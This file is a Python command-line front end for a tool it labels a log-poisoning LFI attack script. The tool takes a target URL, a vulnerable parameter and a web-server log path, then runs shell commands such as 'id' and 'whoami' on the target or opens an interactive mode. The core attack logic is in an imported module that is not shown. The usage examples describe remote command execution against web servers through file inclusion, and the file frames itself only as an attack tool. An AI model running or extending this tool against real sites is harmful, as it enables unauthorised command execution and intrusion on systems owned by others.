#!/usr/bin/env python3
"""
Refactored log poisoning LFI attack script.
Now follows SOLID principles with modular architecture.
"""

import sys
import argparse

from app import LogPoisoningApp


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description='Log Poisoning LFI Attack Script',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Scan for vulnerable logs and interactive mode
  python3 log_poison.py -u http://target.com/index.php
  
  # Execute single command
  python3 log_poison.py -u http://target.com/index.php -c "ls -la"
  
  # Use specific log file
  python3 log_poison.py -u http://target.com/index.php -l /var/log/apache2/access.log
  
  # Custom parameter name
  python3 log_poison.py -u http://target.com/index.php -p page -c "id"
  
  # Specific log with command
  python3 log_poison.py -u http://target.com/index.php -l /var/log/nginx/access.log -c "whoami"
        '''
    )
    
    parser.add_argument('-u', '--url', required=True,
                       help='Target URL (e.g., http://target.com/index.php)')
    parser.add_argument('-p', '--param', default='language',
                       help='Vulnerable parameter name (default: language)')
    parser.add_argument('-c', '--command',
                       help='Single command to execute (default: interactive mode)')
    parser.add_argument('-l', '--log',
                       help='Specific log file path to use (skips scanning)')
    
    args = parser.parse_args()
    
    # Create and run application
    app = LogPoisoningApp(args.url, args.param)
    
    try:
        app.run(args.command, args.log)
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
    finally:
        app.cleanup()


if __name__ == "__main__":
    main()
